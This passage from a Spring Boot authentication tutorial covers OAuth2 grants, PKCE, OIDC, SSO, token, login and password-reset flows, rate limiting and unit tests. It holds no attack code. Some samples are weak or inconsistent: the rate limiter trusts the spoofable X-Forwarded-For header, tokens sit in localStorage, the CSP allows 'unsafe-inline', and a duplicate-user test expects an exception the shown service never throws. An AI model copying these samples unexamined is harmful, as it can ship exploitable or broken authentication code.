Used when your backend needs to access another API (no user involved).

**Example:** Your app backs up data to Google Drive automatically.

```
POST /token HTTP/1.1
Host: oauth-server.com
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials
&client_id=YOUR_CLIENT_ID
&client_secret=YOUR_CLIENT_SECRET
&scope=backup.write

Response:
{
    "access_token": "eyJhbGc...",
    "token_type": "Bearer",
    "expires_in": 3600
}
```

**Spring Boot Implementation:**
```java
@Service
public class ExternalApiService {
    
    @Value("${oauth2.client-id}")
    private String clientId;
    
    @Value("${oauth2.client-secret}")
    private String clientSecret;
    
    @Value("${oauth2.token-url}")
    private String tokenUrl;
    
    private String accessToken;
    private Instant tokenExpiry;
    
    public String getAccessToken() {
        // Check if token is still valid
        if (accessToken != null && Instant.now().isBefore(tokenExpiry)) {
            return accessToken;
        }
        
        // Get new token
        MultiValueMap<String, String> body = new LinkedMultiValueMap<>();
        body.add("grant_type", "client_credentials");
        body.add("client_id", clientId);
        body.add("client_secret", clientSecret);
        body.add("scope", "backup.write");
        
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<Map> response = restTemplate.postForEntity(
            tokenUrl,
            new HttpEntity<>(body),
            Map.class
        );
        
        Map<String, Object> tokenResponse = response.getBody();
        this.accessToken = (String) tokenResponse.get("access_token");
        int expiresIn = (Integer) tokenResponse.get("expires_in");
        this.tokenExpiry = Instant.now().plusSeconds(expiresIn);
        
        return accessToken;
    }
    
    public void backupData(String data) {
        String token = getAccessToken();
        
        HttpHeaders headers = new HttpHeaders();
        headers.setBearerAuth(token);
        headers.setContentType(MediaType.APPLICATION_JSON);
        
        HttpEntity<String> request = new HttpEntity<>(data, headers);
        
        RestTemplate restTemplate = new RestTemplate();
        restTemplate.postForEntity(
            "https://api.external.com/backup",
            request,
            String.class
        );
    }
}
```

---

#### **PKCE (Proof Key for Code Exchange)**

Security extension for public clients (mobile apps, SPAs) where client_secret can't be kept secure.

**How it works:**
1. Client generates random `code_verifier`
2. Creates `code_challenge` = SHA256(code_verifier)
3. Sends code_challenge with authorization request
4. When exchanging code for token, sends code_verifier
5. Server verifies: SHA256(code_verifier) == code_challenge

**Spring Boot PKCE Support:**
```java
// Spring Security OAuth2 Client handles PKCE automatically for SPAs
// Just enable it in configuration:

@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .oauth2Login(oauth2 -> oauth2
            .authorizationEndpoint(authorization -> authorization
                .authorizationRequestResolver(
                    pkceAuthorizationRequestResolver()
                )
            )
        );
    return http.build();
}

private OAuth2AuthorizationRequestResolver pkceAuthorizationRequestResolver() {
    DefaultOAuth2AuthorizationRequestResolver resolver = 
        new DefaultOAuth2AuthorizationRequestResolver(
            this.clientRegistrationRepository,
            "/oauth2/authorization"
        );
    resolver.setAuthorizationRequestCustomizer(
        OAuth2AuthorizationRequestCustomizers.withPkce()
    );
    return resolver;
}
```

---

### 5.3 OpenID Connect (OIDC)

**What is OIDC?**
Identity layer on top of OAuth2. OAuth2 is for authorization, OIDC adds authentication.

**Key Difference:**
- **OAuth2**: "Can I access user's photos?" → Access Token
- **OIDC**: "Who is the user?" → ID Token + Access Token

**ID Token (JWT):**
```json
{
  "iss": "https://accounts.google.com",
  "sub": "10769150350006150715113082367",
  "aud": "your-client-id",
  "exp": 1516239022,
  "iat": 1516235422,
  "email": "user@example.com",
  "email_verified": true,
  "name": "John Doe",
  "picture": "https://lh3.googleusercontent.com/..."
}
```

**Spring Boot OIDC:**
```java
@RestController
public class UserInfoController {
    
    @GetMapping("/user")
    public Map<String, Object> user(@AuthenticationPrincipal OidcUser principal) {
        // OIDC provides ID token with user claims
        return Map.of(
            "name", principal.getAttribute("name"),
            "email", principal.getAttribute("email"),
            "picture", principal.getAttribute("picture"),
            "sub", principal.getAttribute("sub") // Unique user ID
        );
    }
}
```

**application.yml for OIDC:**
```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id: YOUR_CLIENT_ID
            client-secret: YOUR_CLIENT_SECRET
            scope:
              - openid    # Required for OIDC
              - email
              - profile
        provider:
          google:
            issuer-uri: https://accounts.google.com
```

---

### 5.4 Single Sign-On (SSO)

**What is SSO?**
One login for multiple applications.

**Example:** Login to Gmail, automatically logged into YouTube, Drive, Maps.

**How it works:**
1. User logs into App A (creates session with Identity Provider)
2. User navigates to App B
3. App B checks with Identity Provider
4. Identity Provider says "User already authenticated"
5. App B grants access without login

**Spring Boot SSO Setup:**

**Identity Provider (Central Auth Server):**
```java
// Using Spring Authorization Server
@Configuration
@EnableAuthorizationServer
public class AuthServerConfig {
    
    @Bean
    public RegisteredClientRepository registeredClientRepository() {
        RegisteredClient appClient = RegisteredClient.withId(UUID.randomUUID().toString())
            .clientId("app-client")
            .clientSecret("{noop}secret")
            .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)
            .redirectUri("http://app1.com/login/oauth2/code/auth-server")
            .redirectUri("http://app2.com/login/oauth2/code/auth-server")
            .scope("read")
            .scope("write")
            .build();
        
        return new InMemoryRegisteredClientRepository(appClient);
    }
}
```

**Client Applications:**
```yaml
# App 1 - application.yml
spring:
  security:
    oauth2:
      client:
        registration:
          auth-server:
            client-id: app-client
            client-secret: secret
            authorization-grant-type: authorization_code
            redirect-uri: http://app1.com/login/oauth2/code/auth-server
            scope: read,write
        provider:
          auth-server:
            issuer-uri: http://auth-server.com
```

**Flow:**
```
1. User visits App1 → Redirected to Auth Server
2. User logs in once at Auth Server
3. Auth Server creates session (cookie: JSESSIONID)
4. Redirected back to App1 with authorization code
5. App1 exchanges code for token
6. User logged into App1

7. User visits App2 → Redirected to Auth Server
8. Auth Server checks session cookie (already logged in!)
9. Automatically redirects back to App2 with code
10. App2 exchanges code for token
11. User logged into App2 (no login screen shown!)
```

**Key Components:**
- **Identity Provider (IdP)**: Manages authentication (Auth Server)
- **Service Providers (SP)**: Applications trusting the IdP (App1, App2)
- **Session**: Maintained at IdP level across all apps

---

## Phase 6: Implementation Flows

### 6.1 Complete Registration Flow

```
User Input → Validation → Password Hashing → 
Save to DB → Generate Verification Token → 
Send Email → User Clicks Link → Activate Account
```

**Controller:**
```java
@RestController
@RequestMapping("/api/auth")
public class AuthController {
    
    @Autowired
    private UserService userService;
    
    @Autowired
    private EmailService emailService;
    
    @PostMapping("/register")
    public ResponseEntity<?> register(@Valid @RequestBody RegisterRequest request) {
        
        // Check if username/email already exists
        if (userService.existsByUsername(request.getUsername())) {
            return ResponseEntity.badRequest()
                .body(Map.of("error", "Username already taken"));
        }
        
        if (userService.existsByEmail(request.getEmail())) {
            return ResponseEntity.badRequest()
                .body(Map.of("error", "Email already registered"));
        }
        
        // Create user
        User user = userService.createUser(request);
        
        // Generate verification token
        String token = userService.generateVerificationToken(user);
        
        // Send email
        emailService.sendVerificationEmail(user.getEmail(), token);
        
        return ResponseEntity.ok(Map.of(
            "message", "Registration successful. Please check your email to verify account."
        ));
    }
    
    @GetMapping("/verify")
    public ResponseEntity<?> verifyEmail(@RequestParam String token) {
        
        boolean verified = userService.verifyEmail(token);
        
        if (verified) {
            return ResponseEntity.ok(Map.of(
                "message", "Email verified successfully. You can now login."
            ));
        }
        
        return ResponseEntity.badRequest().body(Map.of(
            "error", "Invalid or expired verification token"
        ));
    }
}
```

**Service Implementation:**
```java
@Service
public class UserService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Autowired
    private PasswordEncoder passwordEncoder;
    
    @Autowired
    private VerificationTokenRepository tokenRepository;
    
    public User createUser(RegisterRequest request) {
        User user = new User();
        user.setUsername(request.getUsername());
        user.setEmail(request.getEmail());
        user.setPassword(passwordEncoder.encode(request.getPassword()));
        user.setEnabled(false); // Not enabled until email verified
        user.setRoles(Set.of(new Role("ROLE_USER")));
        
        return userRepository.save(user);
    }
    
    public String generateVerificationToken(User user) {
        String token = UUID.randomUUID().toString();
        
        VerificationToken verificationToken = new VerificationToken();
        verificationToken.setToken(token);
        verificationToken.setUser(user);
        verificationToken.setExpiryDate(LocalDateTime.now().plusHours(24));
        
        tokenRepository.save(verificationToken);
        
        return token;
    }
    
    public boolean verifyEmail(String token) {
        VerificationToken verificationToken = tokenRepository.findByToken(token)
            .orElse(null);
        
        if (verificationToken == null) {
            return false;
        }
        
        if (verificationToken.getExpiryDate().isBefore(LocalDateTime.now())) {
            tokenRepository.delete(verificationToken);
            return false;
        }
        
        User user = verificationToken.getUser();
        user.setEnabled(true);
        userRepository.save(user);
        
        tokenRepository.delete(verificationToken);
        
        return true;
    }
}
```

**Verification Token Entity:**
```java
@Entity
public class VerificationToken {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String token;
    
    @OneToOne
    @JoinColumn(name = "user_id")
    private User user;
    
    private LocalDateTime expiryDate;
}
```

**Email Service:**
```java
@Service
public class EmailService {
    
    @Autowired
    private JavaMailSender mailSender;
    
    @Value("${app.base-url}")
    private String baseUrl;
    
    public void sendVerificationEmail(String to, String token) {
        String subject = "Verify your email";
        String verificationUrl = baseUrl + "/api/auth/verify?token=" + token;
        
        String body = String.format(
            "Click the link to verify your email: %s\n\n" +
            "This link expires in 24 hours.",
            verificationUrl
        );
        
        SimpleMailMessage message = new SimpleMailMessage();
        message.setTo(to);
        message.setSubject(subject);
        message.setText(body);
        
        mailSender.send(message);
    }
}
```

**Validation (RegisterRequest DTO):**
```java
public class RegisterRequest {
    
    @NotBlank(message = "Username is required")
    @Size(min = 3, max = 20, message = "Username must be between 3-20 characters")
    private String username;
    
    @NotBlank(message = "Email is required")
    @Email(message = "Invalid email format")
    private String email;
    
    @NotBlank(message = "Password is required")
    @Pattern(
        regexp = "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{8,}$",
        message = "Password must be at least 8 characters with uppercase, lowercase, number, and special character"
    )
    private String password;
}
```

---

### 6.2 Complete Login Flow

```
Credentials → Authenticate → Generate Tokens → 
Store Refresh Token → Return Tokens to Client
```

**Controller:**
```java
@PostMapping("/login")
public ResponseEntity<?> login(@Valid @RequestBody LoginRequest request) {
    
    try {
        // Authenticate user
        Authentication authentication = authenticationManager.authenticate(
            new UsernamePasswordAuthenticationToken(
                request.getUsername(),
                request.getPassword()
            )
        );
        
        SecurityContextHolder.getContext().setAuthentication(authentication);
        
        // Get user details
        UserDetails userDetails = (UserDetails) authentication.getPrincipal();
        User user = userRepository.findByUsername(userDetails.getUsername())
            .orElseThrow();
        
        // Check if account is verified
        if (!user.isEnabled()) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN)
                .body(Map.of("error", "Please verify your email first"));
        }
        
        // Generate tokens
        String accessToken = jwtService.generateToken(userDetails);
        RefreshToken refreshToken = refreshTokenService.createRefreshToken(user.getId());
        
        // Update last login
        user.setLastLogin(LocalDateTime.now());
        userRepository.save(user);
        
        return ResponseEntity.ok(new AuthResponse(
            accessToken,
            refreshToken.getToken(),
            "Bearer",
            jwtService.getExpirationTime()
        ));
        
    } catch (BadCredentialsException e) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
            .body(Map.of("error", "Invalid username or password"));
    } catch (DisabledException e) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN)
            .body(Map.of("error", "Account is disabled"));
    }
}
```

**JWT Service:**
```java
@Service
public class JwtService {
    
    @Value("${jwt.secret}")
    private String SECRET_KEY;
    
    @Value("${jwt.expiration}")
    private long EXPIRATION_TIME; // 15 minutes
    
    public String generateToken(UserDetails userDetails) {
        Map<String, Object> claims = new HashMap<>();
        claims.put("roles", userDetails.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .collect(Collectors.toList())
        );
        
        return Jwts.builder()
            .setClaims(claims)
            .setSubject(userDetails.getUsername())
            .setIssuedAt(new Date())
            .setExpiration(new Date(System.currentTimeMillis() + EXPIRATION_TIME))
            .signWith(SignatureAlgorithm.HS512, SECRET_KEY)
            .compact();
    }
    
    public String extractUsername(String token) {
        return extractClaim(token, Claims::getSubject);
    }
    
    public Date extractExpiration(String token) {
        return extractClaim(token, Claims::getExpiration);
    }
    
    public <T> T extractClaim(String token, Function<Claims, T> claimsResolver) {
        final Claims claims = extractAllClaims(token);
        return claimsResolver.apply(claims);
    }
    
    private Claims extractAllClaims(String token) {
        return Jwts.parser()
            .setSigningKey(SECRET_KEY)
            .parseClaimsJws(token)
            .getBody();
    }
    
    public Boolean validateToken(String token, UserDetails userDetails) {
        final String username = extractUsername(token);
        return (username.equals(userDetails.getUsername()) && !isTokenExpired(token));
    }
    
    private Boolean isTokenExpired(String token) {
        return extractExpiration(token).before(new Date());
    }
    
    public long getExpirationTime() {
        return EXPIRATION_TIME;
    }
}
```

**Refresh Token Service:**
```java
@Service
public class RefreshTokenService {
    
    @Value("${jwt.refresh-expiration}")
    private long REFRESH_EXPIRATION; // 7 days
    
    @Autowired
    private RefreshTokenRepository refreshTokenRepository;
    
    public RefreshToken createRefreshToken(Long userId) {
        // Delete old refresh tokens for this user (optional - single device)
        // refreshTokenRepository.deleteByUserId(userId);
        
        RefreshToken refreshToken = new RefreshToken();
        refreshToken.setUserId(userId);
        refreshToken.setToken(UUID.randomUUID().toString());
        refreshToken.setExpiryDate(Instant.now().plusMillis(REFRESH_EXPIRATION));
        
        return refreshTokenRepository.save(refreshToken);
    }
    
    public RefreshToken verifyExpiration(RefreshToken token) {
        if (token.getExpiryDate().isBefore(Instant.now())) {
            refreshTokenRepository.delete(token);
            throw new TokenRefreshException("Refresh token expired. Please login again.");
        }
        return token;
    }
}
```

---

### 6.3 Token Refresh Flow

```
Access Token Expired → Send Refresh Token → 
Validate Refresh Token → Generate New Access Token → 
Return New Token
```

**Controller:**
```java
@PostMapping("/refresh")
public ResponseEntity<?> refreshToken(@RequestBody TokenRefreshRequest request) {
    
    String requestRefreshToken = request.getRefreshToken();
    
    return refreshTokenRepository.findByToken(requestRefreshToken)
        .map(refreshTokenService::verifyExpiration)
        .map(RefreshToken::getUserId)
        .map(userId -> {
            User user = userRepository.findById(userId)
                .orElseThrow(() -> new RuntimeException("User not found"));
            
            String newAccessToken = jwtService.generateToken(user);
            
            return ResponseEntity.ok(new TokenRefreshResponse(
                newAccessToken,
                requestRefreshToken,
                "Bearer"
            ));
        })
        .orElseThrow(() -> new TokenRefreshException("Refresh token not found"));
}
```

**Token Rotation (More Secure):**
```java
@PostMapping("/refresh")
public ResponseEntity<?> refreshTokenWithRotation(@RequestBody TokenRefreshRequest request) {
    
    String requestRefreshToken = request.getRefreshToken();
    
    return refreshTokenRepository.findByToken(requestRefreshToken)
        .map(refreshTokenService::verifyExpiration)
        .map(refreshToken -> {
            User user = userRepository.findById(refreshToken.getUserId())
                .orElseThrow();
            
            // Generate new access token
            String newAccessToken = jwtService.generateToken(user);
            
            // Delete old refresh token
            refreshTokenRepository.delete(refreshToken);
            
            // Generate new refresh token (rotation)
            RefreshToken newRefreshToken = refreshTokenService.createRefreshToken(user.getId());
            
            return ResponseEntity.ok(new TokenRefreshResponse(
                newAccessToken,
                newRefreshToken.getToken(),
                "Bearer"
            ));
        })
        .orElseThrow(() -> new TokenRefreshException("Refresh token not found"));
}
```

**Frontend Handling:**
```javascript
// Interceptor for automatic token refresh
axios.interceptors.response.use(
    response => response,
    async error => {
        const originalRequest = error.config;
        
        // If 401 and haven't retried yet
        if (error.response.status === 401 && !originalRequest._retry) {
            originalRequest._retry = true;
            
            try {
                const refreshToken = localStorage.getItem('refreshToken');
                const response = await axios.post('/api/auth/refresh', {
                    refreshToken: refreshToken
                });
                
                const { accessToken, refreshToken: newRefreshToken } = response.data;
                
                localStorage.setItem('accessToken', accessToken);
                localStorage.setItem('refreshToken', newRefreshToken);
                
                // Retry original request with new token
                originalRequest.headers['Authorization'] = 'Bearer ' + accessToken;
                return axios(originalRequest);
                
            } catch (refreshError) {
                // Refresh failed - redirect to login
                localStorage.clear();
                window.location.href = '/login';
                return Promise.reject(refreshError);
            }
        }
        
        return Promise.reject(error);
    }
);
```

---

### 6.4 Logout Flow

**Simple Logout (Stateless):**
```java
@PostMapping("/logout")
public ResponseEntity<?> logout(@RequestHeader("Authorization") String authHeader) {
    
    String token = authHeader.substring(7); // Remove "Bearer "
    
    // Extract user info
    String username = jwtService.extractUsername(token);
    User user = userRepository.findByUsername(username).orElseThrow();
    
    // Delete all refresh tokens for this user
    refreshTokenRepository.deleteByUserId(user.getId());
    
    // Client must delete access token from storage
    return ResponseEntity.ok(Map.of("message", "Logged out successfully"));
}
```

**Logout with Token Blacklist (More Secure):**
```java
@Service
public class TokenBlacklistService {
    
    // Using Redis for fast lookup
    @Autowired
    private RedisTemplate<String, String> redisTemplate;
    
    public void blacklistToken(String token, long expirationTime) {
        // Store token in Redis with expiration
        redisTemplate.opsForValue().set(
            "blacklist:" + token,
            "true",
            expirationTime,
            TimeUnit.MILLISECONDS
        );
    }
    
    public boolean isBlacklisted(String token) {
        return Boolean.TRUE.equals(
            redisTemplate.hasKey("blacklist:" + token)
        );
    }
}

@PostMapping("/logout")
public ResponseEntity<?> logoutWithBlacklist(@RequestHeader("Authorization") String authHeader) {
    
    String token = authHeader.substring(7);
    
    // Add to blacklist
    long expirationTime = jwtService.extractExpiration(token).getTime() - System.currentTimeMillis();
    tokenBlacklistService.blacklistToken(token, expirationTime);
    
    // Delete refresh tokens
    String username = jwtService.extractUsername(token);
    User user = userRepository.findByUsername(username).orElseThrow();
    refreshTokenRepository.deleteByUserId(user.getId());
    
    return ResponseEntity.ok(Map.of("message", "Logged out successfully"));
}

// Update JWT filter to check blacklist
@Override
protected void doFilterInternal(HttpServletRequest request, 
                                HttpServletResponse response, 
                                FilterChain filterChain) {
    String token = extractToken(request);
    
    if (token != null && !tokenBlacklistService.isBlacklisted(token)) {
        // Process token
    }
    
    filterChain.doFilter(request, response);
}
```

**Logout All Devices:**
```java
@PostMapping("/logout-all")
public ResponseEntity<?> logoutAllDevices(Authentication authentication) {
    
    String username = authentication.getName();
    User user = userRepository.findByUsername(username).orElseThrow();
    
    // Delete all refresh tokens
    refreshTokenRepository.deleteByUserId(user.getId());
    
    // Optionally: Update user's token version to invalidate all JWTs
    user.setTokenVersion(user.getTokenVersion() + 1);
    userRepository.save(user);
    
    return ResponseEntity.ok(Map.of("message", "Logged out from all devices"));
}
```

---

### 6.5 Password Reset Flow

```
Request Reset → Generate Token → Send Email → 
User Clicks Link → Verify Token → Set New Password → 
Invalidate Token
```

**Controller:**
```java
@PostMapping("/forgot-password")
public ResponseEntity<?> forgotPassword(@RequestBody Map<String, String> request) {
    
    String email = request.get("email");
    
    User user = userRepository.findByEmail(email).orElse(null);
    
    // Don't reveal if email exists (security)
    if (user == null) {
        return ResponseEntity.ok(Map.of(
            "message", "If email exists, password reset link has been sent"
        ));
    }
    
    // Generate reset token
    String resetToken = UUID.randomUUID().toString();
    
    PasswordResetToken token = new PasswordResetToken();
    token.setToken(resetToken);
    token.setUser(user);
    token.setExpiryDate(LocalDateTime.now().plusHours(1)); // 1 hour expiry
    
    passwordResetTokenRepository.save(token);
    
    // Send email
    emailService.sendPasswordResetEmail(user.getEmail(), resetToken);
    
    return ResponseEntity.ok(Map.of(
        "message", "If email exists, password reset link has been sent"
    ));
}

@PostMapping("/reset-password")
public ResponseEntity<?> resetPassword(@RequestBody PasswordResetRequest request) {
    
    PasswordResetToken resetToken = passwordResetTokenRepository
        .findByToken(request.getToken())
        .orElse(null);
    
    // Validate token
    if (resetToken == null) {
        return ResponseEntity.badRequest()
            .body(Map.of("error", "Invalid reset token"));
    }
    
    if (resetToken.getExpiryDate().isBefore(LocalDateTime.now())) {
        passwordResetTokenRepository.delete(resetToken);
        return ResponseEntity.badRequest()
            .body(Map.of("error", "Reset token expired"));
    }
    
    // Update password
    User user = resetToken.getUser();
    user.setPassword(passwordEncoder.encode(request.getNewPassword()));
    userRepository.save(user);
    
    // Delete token (one-time use)
    passwordResetTokenRepository.delete(resetToken);
    
    // Invalidate all refresh tokens (force re-login)
    refreshTokenRepository.deleteByUserId(user.getId());
    
    return ResponseEntity.ok(Map.of(
        "message", "Password reset successfully"
    ));
}
```

**Email Template:**
```java
public void sendPasswordResetEmail(String to, String token) {
    String resetUrl = baseUrl + "/reset-password?token=" + token;
    
    String body = String.format(
        "You requested a password reset.\n\n" +
        "Click here to reset: %s\n\n" +
        "This link expires in 1 hour.\n\n" +
        "If you didn't request this, please ignore this email.",
        resetUrl
    );
    
    SimpleMailMessage message = new SimpleMailMessage();
    message.setTo(to);
    message.setSubject("Password Reset Request");
    message.setText(body);
    
    mailSender.send(message);
}
```

---

## Phase 7: Security Best Practices

### 7.1 Rate Limiting

Prevent brute force attacks on login endpoints.

**Using Bucket4j:**
```xml
<dependency>
    <groupId>com.github.vladimir-bukhtoyarov</groupId>
    <artifactId>bucket4j-core</artifactId>
    <version>8.1.0</version>
</dependency>
```

**Rate Limit Service:**
```java
@Service
public class RateLimitService {
    
    private final Map<String, Bucket> cache = new ConcurrentHashMap<>();
    
    public Bucket resolveBucket(String key) {
        return cache.computeIfAbsent(key, k -> createNewBucket());
    }
    
    private Bucket createNewBucket() {
        // 5 requests per minute
        Bandwidth limit = Bandwidth.classic(5, Refill.intervally(5, Duration.ofMinutes(1)));
        return Bucket.builder()
            .addLimit(limit)
            .build();
    }
}
```

**Rate Limit Filter:**
```java
@Component
public class RateLimitFilter extends OncePerRequestFilter {
    
    @Autowired
    private RateLimitService rateLimitService;
    
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {
        
        // Only rate limit auth endpoints
        if (request.getRequestURI().startsWith("/api/auth/login") ||
            request.getRequestURI().startsWith("/api/auth/register")) {
            
            String key = getClientIP(request);
            Bucket bucket = rateLimitService.resolveBucket(key);
            
            if (bucket.tryConsume(1)) {
                filterChain.doFilter(request, response);
            } else {
                response.setStatus(HttpStatus.TOO_MANY_REQUESTS.value());
                response.getWriter().write("{\"error\": \"Too many requests. Please try again later.\"}");
            }
        } else {
            filterChain.doFilter(request, response);
        }
    }
    
    private String getClientIP(HttpServletRequest request) {
        String xfHeader = request.getHeader("X-Forwarded-For");
        if (xfHeader == null) {
            return request.getRemoteAddr();
        }
        return xfHeader.split(",")[0];
    }
}
```

**Account Lockout after Failed Attempts:**
```java
@Service
public class LoginAttemptService {
    
    private final Map<String, Integer> attemptsCache = new ConcurrentHashMap<>();
    private static final int MAX_ATTEMPTS = 5;
    
    public void loginSucceeded(String username) {
        attemptsCache.remove(username);
    }
    
    public void loginFailed(String username) {
        int attempts = attemptsCache.getOrDefault(username, 0);
        attemptsCache.put(username, attempts + 1);
    }
    
    public boolean isBlocked(String username) {
        return attemptsCache.getOrDefault(username, 0) >= MAX_ATTEMPTS;
    }
    
    public int getAttempts(String username) {
        return attemptsCache.getOrDefault(username, 0);
    }
}

// In login controller
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    
    // Check if account is locked
    if (loginAttemptService.isBlocked(request.getUsername())) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN)
            .body(Map.of("error", "Account locked due to too many failed attempts"));
    }
    
    try {
        Authentication auth = authenticationManager.authenticate(...);
        loginAttemptService.loginSucceeded(request.getUsername());
        // Generate tokens...
        
    } catch (BadCredentialsException e) {
        loginAttemptService.loginFailed(request.getUsername());
        
        int remainingAttempts = 5 - loginAttemptService.getAttempts(request.getUsername());
        
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
            .body(Map.of(
                "error", "Invalid credentials",
                "remainingAttempts", remainingAttempts
            ));
    }
}
```

---

### 7.2 Audit Logging

Track all authentication and authorization events.

**Audit Log Entity:**
```java
@Entity
public class AuditLog {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String username;
    private String action; // LOGIN, LOGOUT, PASSWORD_CHANGE, ACCESS_DENIED
    private String ipAddress;
    private String userAgent;
    private LocalDateTime timestamp;
    private boolean success;
    private String details;
}
```

**Audit Service:**
```java
@Service
public class AuditService {
    
    @Autowired
    private AuditLogRepository auditLogRepository;
    
    public void logAuthEvent(String username, String action, 
                            HttpServletRequest request, boolean success) {
        
        AuditLog log = new AuditLog();
        log.setUsername(username);
        log.setAction(action);
        log.setIpAddress(getClientIP(request));
        log.setUserAgent(request.getHeader("User-Agent"));
        log.setTimestamp(LocalDateTime.now());
        log.setSuccess(success);
        
        auditLogRepository.save(log);
    }
    
    public void logAccessDenied(String username, String resource, 
                               HttpServletRequest request) {
        
        AuditLog log = new AuditLog();
        log.setUsername(username);
        log.setAction("ACCESS_DENIED");
        log.setDetails("Attempted to access: " + resource);
        log.setIpAddress(getClientIP(request));
        log.setTimestamp(LocalDateTime.now());
        log.setSuccess(false);
        
        auditLogRepository.save(log);
    }
}
```

**Integration with Controllers:**
```java
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request, 
                               HttpServletRequest httpRequest) {
    
    try {
        Authentication auth = authenticationManager.authenticate(...);
        
        auditService.logAuthEvent(request.getUsername(), "LOGIN", httpRequest, true);
        
        // Return tokens...
        
    } catch (BadCredentialsException e) {
        auditService.logAuthEvent(request.getUsername(), "LOGIN", httpRequest, false);
        // Return error...
    }
}
```

---

### 7.3 Security Headers

**Spring Security Configuration:**
```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .headers(headers -> headers
            // Prevent clickjacking
            .frameOptions(frame -> frame.deny())
            
            // Prevent MIME sniffing
            .contentTypeOptions(Customizer.withDefaults())
            
            // Enable XSS protection
            .xssProtection(xss -> xss.enable())
            
            // Content Security Policy
            .contentSecurityPolicy(csp -> 
                csp.policyDirectives("default-src 'self'; script-src 'self' 'unsafe-inline'")
            )
            
            // HSTS (HTTPS only)
            .httpStrictTransportSecurity(hsts -> hsts
                .includeSubDomains(true)
                .maxAgeInSeconds(31536000)
            )
        );
    
    return http.build();
}
```

---

### 7.4 Input Validation

**DTO with Validation:**
```java
public class RegisterRequest {
    
    @NotBlank
    @Size(min = 3, max = 20)
    @Pattern(regexp = "^[a-zA-Z0-9_]+$", message = "Username can only contain letters, numbers, and underscores")
    private String username;
    
    @NotBlank
    @Email
    private String email;
    
    @NotBlank
    @Size(min = 8, max = 100)
    @Pattern(
        regexp = "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]+$",
        message = "Password must contain uppercase, lowercase, number, and special character"
    )
    private String password;
}
```

**Custom Validator:**
```java
@Constraint(validatedBy = PasswordConstraintValidator.class)
@Target({ ElementType.FIELD })
@Retention(RetentionPolicy.RUNTIME)
public @interface ValidPassword {
    String message() default "Invalid password";
    Class<?>[] groups() default {};
    Class<? extends Payload>[] payload() default {};
}

public class PasswordConstraintValidator implements ConstraintValidator<ValidPassword, String> {
    
    @Override
    public boolean isValid(String password, ConstraintValidatorContext context) {
        if (password == null) {
            return false;
        }
        
        // Check common passwords
        List<String> commonPasswords = Arrays.asList("password", "12345678", "qwerty");
        if (commonPasswords.contains(password.toLowerCase())) {
            context.disableDefaultConstraintViolation();
            context.buildConstraintViolationWithTemplate("Password is too common")
                .addConstraintViolation();
            return false;
        }
        
        return true;
    }
}
```

**Global Exception Handler:**
```java
@ControllerAdvice
public class GlobalExceptionHandler {
    
    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ResponseEntity<?> handleValidationExceptions(MethodArgumentNotValidException ex) {
        
        Map<String, String> errors = new HashMap<>();
        ex.getBindingResult().getFieldErrors().forEach(error -> 
            errors.put(error.getField(), error.getDefaultMessage())
        );
        
        return ResponseEntity.badRequest().body(errors);
    }
    
    @ExceptionHandler(BadCredentialsException.class)
    public ResponseEntity<?> handleBadCredentials(BadCredentialsException ex) {
        return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
            .body(Map.of("error", "Invalid credentials"));
    }
    
    @ExceptionHandler(AccessDeniedException.class)
    public ResponseEntity<?> handleAccessDenied(AccessDeniedException ex) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN)
            .body(Map.of("error", "Access denied"));
    }
}
```

---

## Phase 8: Testing

### 8.1 Unit Tests

**Test UserService:**
```java
@ExtendWith(MockitoExtension.class)
public class UserServiceTest {
    
    @Mock
    private UserRepository userRepository;
    
    @Mock
    private PasswordEncoder passwordEncoder;
    
    @InjectMocks
    private UserService userService;
    
    @Test
    public void testCreateUser_Success() {
        // Arrange
        RegisterRequest request = new RegisterRequest();
        request.setUsername("testuser");
        request.setEmail("test@example.com");
        request.setPassword("Test@123");
        
        when(passwordEncoder.encode(anyString())).thenReturn("hashedPassword");
        when(userRepository.save(any(User.class))).thenAnswer(i -> i.getArguments()[0]);
        
        // Act
        User user = userService.createUser(request);
        
        // Assert
        assertNotNull(user);
        assertEquals("testuser", user.getUsername());
        assertEquals("hashedPassword", user.getPassword());
        verify(userRepository, times(1)).save(any(User.class));
    }
    
    @Test
    public void testCreateUser_DuplicateUsername() {
        when(userRepository.existsByUsername("testuser")).thenReturn(true);
        
        assertThrows(DuplicateUserException.class, () -> {
            RegisterRequest request = new RegisterRequest();
            request.setUsername("testuser");
            userService.createUser(request);
        });
    }
}
```

**Test JWT Service:**
```java
@ExtendWith(MockitoExtension.class)
public class JwtServiceTest {
    
    @InjectMocks
    private JwtService jwtService;
    
    @BeforeEach
    public void setup() {
        ReflectionTestUtils.setField(jwtService, "SECRET_KEY", "testSecretKeyForJWTToken");
        ReflectionTestUtils.setField(jwtService, "EXPIRATION_TIME", 900000L);
    }
    
    @Test
    public void testGenerateToken() {
        UserDetails userDetails = User.builder()
            .username("testuser")
            .password("password")
            .authorities(new ArrayList<>())
            .build();
        
        String token = jwtService.generateToken(userDetails);
        
